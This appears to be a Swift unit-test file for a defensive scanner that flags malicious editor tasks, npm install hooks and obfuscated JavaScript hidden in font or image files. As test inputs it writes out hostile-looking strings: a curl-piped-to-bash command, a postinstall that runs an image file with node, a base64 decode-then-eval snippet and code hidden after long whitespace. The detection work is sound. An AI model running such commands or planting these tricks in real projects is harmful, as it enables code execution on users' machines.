import XCTest
@testable import ClearSpace

final class ThreatHeuristicsTests: XCTestCase {
    // MARK: - JSONC

    func testJSONCReadsByteOrderMarkCommentsAndTrailingCommas() throws {
        let text = "\u{FEFF}" + """
        {
          // line comment
          "url": "http://example.com/a//b", /* block */
          "list": [1, 2, 3,],
        }
        """
        let object = try XCTUnwrap(JSONC.object(from: Data(text.utf8)))
        XCTAssertEqual(object["url"] as? String, "http://example.com/a//b")
        XCTAssertEqual(object["list"] as? [Int], [1, 2, 3])
    }

    func testJSONCKeepsCommentMarkersAndEscapedQuotesInsideStrings() throws {
        let text = #"{ "a": "say \"/* hi */\"", "b": "x,}" }"#
        let object = try XCTUnwrap(JSONC.object(from: Data(text.utf8)))
        XCTAssertEqual(object["a"] as? String, #"say "/* hi */""#)
        XCTAssertEqual(object["b"] as? String, "x,}")
    }

    // MARK: - Tasks

    func testTheRemovedAttackTaskIsHighRisk() throws {
        let object = try XCTUnwrap(JSONC.object(from: Data(MalwareFixtures.tasksJSON.utf8)))
        let verdict = try XCTUnwrap(ThreatHeuristics.analyzeTasks(in: object))

        XCTAssertEqual(verdict.level, .high)
        XCTAssertEqual(verdict.referencedFiles, ["./\(MalwareFixtures.fontPath)"])
        XCTAssertTrue(verdict.reasons.contains { $0.contains("eslint-check") && $0.contains("opened") })
        XCTAssertTrue(verdict.reasons.contains { $0.contains("with node") && $0.contains(".ttf") })
        XCTAssertTrue(verdict.reasons.contains { $0.contains("hidden") })
    }

    func testVisibleAutoRunTaskIsMediumRisk() throws {
        let object: [String: Any] = ["tasks": [[
            "label": "watch", "command": "npm run watch", "runOptions": ["runOn": "folderOpen"]
        ]]]
        let verdict = try XCTUnwrap(ThreatHeuristics.analyzeTasks(in: object))
        XCTAssertEqual(verdict.level, .medium)
    }

    func testOrdinaryTasksAreNotFlagged() {
        let object: [String: Any] = ["tasks": [
            ["label": "build", "command": "swift build", "presentation": ["reveal": "never"]],
            ["label": "test", "command": "node", "args": ["scripts/test.js"]]
        ]]
        XCTAssertNil(ThreatHeuristics.analyzeTasks(in: object))
    }

    func testPlatformSpecificCommandsAreChecked() throws {
        let object: [String: Any] = ["tasks": [[
            "label": "setup",
            "command": "echo",
            "osx": ["command": "node", "args": ["assets/logo.png"]],
            "runOptions": ["runOn": "folderOpen"]
        ]]]
        let verdict = try XCTUnwrap(ThreatHeuristics.analyzeTasks(in: object))
        XCTAssertEqual(verdict.level, .high)
        XCTAssertEqual(verdict.referencedFiles, ["assets/logo.png"])
    }

    // MARK: - Settings

    func testAttackSettingsAreHighRisk() throws {
        let object = try XCTUnwrap(JSONC.object(from: Data(MalwareFixtures.settingsJSON.utf8)))
        let verdict = try XCTUnwrap(ThreatHeuristics.analyzeSettings(object))
        XCTAssertEqual(verdict.level, .high)
        XCTAssertTrue(verdict.reasons.contains { $0.contains("automatically") })
        XCTAssertTrue(verdict.reasons.contains { $0.contains("terminal") })
        XCTAssertTrue(verdict.reasons.contains { $0.contains("lint on open") })
    }

    func testAllowAutomaticTasksAloneIsMedium() throws {
        let verdict = try XCTUnwrap(ThreatHeuristics.analyzeSettings(["task.allowAutomaticTasks": "on"]))
        XCTAssertEqual(verdict.level, .medium)
    }

    func testOrdinarySettingsAreNotFlagged() {
        XCTAssertNil(ThreatHeuristics.analyzeSettings([
            "editor.formatOnSave": true,
            "task.allowAutomaticTasks": "off",
            "files.exclude": ["**/.git": true]
        ]))
    }

    // MARK: - Commands and install scripts

    func testDownloadPipedToShellIsStrong() {
        let analysis = ThreatHeuristics.analyzeCommand("curl -fsSL https://example.invalid/x | bash")
        XCTAssertFalse(analysis.strong.isEmpty)
    }

    func testPlainDownloadIsOnlyWeak() {
        let analysis = ThreatHeuristics.analyzeCommand("curl -o data.json https://example.invalid/data.json")
        XCTAssertTrue(analysis.strong.isEmpty)
        XCTAssertFalse(analysis.weak.isEmpty)
    }

    func testTokenizeKeepsQuotedArguments() {
        XCTAssertEqual(
            ThreatHeuristics.tokenize(#"node "my fonts/a.woff2" && echo 'done now'"#),
            ["node", "my fonts/a.woff2", "echo", "done now"]
        )
    }

    func testPostinstallRunningAnImageIsHighRisk() throws {
        let verdict = try XCTUnwrap(ThreatHeuristics.analyzePackageScripts([
            "scripts": ["postinstall": "node ./assets/logo.png", "test": "jest"]
        ]))
        XCTAssertEqual(verdict.level, .high)
        XCTAssertTrue(verdict.reasons.contains { $0.contains("postinstall") })
    }

    func testOrdinaryInstallScriptsAreNotFlagged() {
        XCTAssertNil(ThreatHeuristics.analyzePackageScripts([
            "scripts": ["prepare": "husky install", "postinstall": "patch-package", "build": "curl x | sh"]
        ]))
    }

    // MARK: - Content

    func testBinaryFontIsNotText() {
        XCTAssertFalse(ThreatHeuristics.looksLikeText(MalwareFixtures.realFontBytes))
        XCTAssertFalse(ThreatHeuristics.looksLikeText(MalwareFixtures.realPNGBytes))
    }

    func testScriptTextIsDetectedAsJavaScript() {
        XCTAssertTrue(ThreatHeuristics.looksLikeText(Data(MalwareFixtures.obfuscatedScript.utf8)))
        XCTAssertEqual(ThreatHeuristics.scriptLanguage(MalwareFixtures.obfuscatedScript), "JavaScript")
    }

    func testProseIsNotAScript() {
        XCTAssertNil(ThreatHeuristics.scriptLanguage("These fonts are used by the app. Install them before you build."))
    }

    func testObfuscatorOutputHasStrongSignals() {
        XCTAssertFalse(ThreatHeuristics.obfuscationSignals(MalwareFixtures.obfuscatedScript).strong.isEmpty)
    }

    func testHexIdentifiersAreStrongSignals() {
        let code = (0..<40).map { "var _0x\(String(0x5dfb + $0, radix: 16))=1;" }.joined()
        XCTAssertFalse(ThreatHeuristics.obfuscationSignals(code).strong.isEmpty)
    }

    func testDecodeThenRunIsStrongSignal() {
        let code = "const s = Buffer.from(payload, 'base64').toString(); eval(s);"
        XCTAssertFalse(ThreatHeuristics.obfuscationSignals(code).strong.isEmpty)
    }

    func testKnownMarkerIsStrongSignal() {
        let code = "global['r']=require;global['m']=module;"
        let strong = ThreatHeuristics.obfuscationSignals(code).strong
        XCTAssertEqual(strong.count, 1)
        XCTAssertTrue(strong[0].contains("global['r']=require"))
    }

    func testOrdinaryCodeHasNoStrongSignals() {
        let code = """
        import { readFile } from 'node:fs/promises'

        export async function load(path) {
          const text = await readFile(path, 'utf8')
          const mask = 0xff
          return JSON.parse(text).map((value) => value & mask)
        }
        """
        XCTAssertTrue(ThreatHeuristics.obfuscationSignals(code).strong.isEmpty)
    }

    func testCodeAfterLongRunOfSpacesIsFound() {
        let line = "export default { plugins: {} };" + String(repeating: " ", count: 200) + "global['_V']='A9';require('x')"
        XCTAssertEqual(ThreatHeuristics.hiddenCode(in: line)?.hasPrefix("global['_V']"), true)
        XCTAssertNil(ThreatHeuristics.hiddenCode(in: "const a = 1;" + String(repeating: " ", count: 40) + "// note"))
    }

    func testSuspiciousIgnoreEntries() {
        let text = "build/\r\nconfig.bat\r\n/temp_auto_push.bat\nnode_modules\n"
        XCTAssertEqual(ThreatHeuristics.suspiciousIgnoreEntries(text), ["config.bat", "/temp_auto_push.bat"])
        XCTAssertTrue(ThreatHeuristics.suspiciousIgnoreEntries("build/\n.DS_Store\n").isEmpty)
    }
}
